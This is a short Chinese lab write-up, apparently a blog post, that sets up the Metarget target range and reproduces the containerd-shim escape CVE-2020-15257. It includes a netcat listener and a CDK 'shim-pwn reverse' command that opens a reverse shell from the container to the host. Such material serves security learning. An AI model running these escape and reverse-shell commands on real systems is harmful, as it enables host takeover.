# Metarget的实践（一）

Metarget是一个开源的容器安全靶机项目，经过验证很方便搭建模拟靶机环境，如下是验证记录，

使用ubuntu18.04，下载项目源码，

git clone https://github.com/Metarget/metarget.git，

安装pip3，sudo apt install python3-pip，

安装环境软件，cd metarget，pip3 install -r requirements.txt，

接着就可以创建自己需要的靶机了，

以cve-2020-15257为例，参考链接，

https://github.com/Metarget/metarget/tree/master/writeups\_cnv/docker-containerd-cve-2020-15257，

安装，./metarget cnv install cve-2020-15257，发现抱错，

加个参数，看看问题是啥，

./metarget cnv install cve-2020-15257 --verbose，

原来是权限问题，需要给root权限，重新来过，

sudo ./metarget cnv install cve-2020-15257，

等一会儿就安装成功了，接着做攻击实验，

拉起一个靶机容器，

sudo docker run -it --net=host --name=15257 ubuntu /bin/bash，

可以查看不安全套接字，cat /proc/net/unix|grep -a "containerd-shim"，

还是攻击更能看效果，先给容器靶机安装个netcat，

apt update，apt install netcat，开启个端口监听，nc -lnvp 1234，

回到宿主机，下载漏洞利用软件，CDK，

wget https://github.com/cdk-team/CDK/releases/download/v1.0.4/cdk\_linux\_amd64，

把CDK拷贝到靶机容器，sudo docker cp cdk\_linux\_amd64 15257:/tmp，

再次进入靶机容器，sudo docker exec -it 15257 bash，

修改CDK文件的权限，cd /tmp，chmod +x cdk\_linux\_amd64，

执行CDK，进行漏洞利用，开始逃逸，

./cdk\_linux\_amd64 run shim-pwn reverse 10.90.11.162 1234，

端口监听那边就拿到宿主机的shell了，
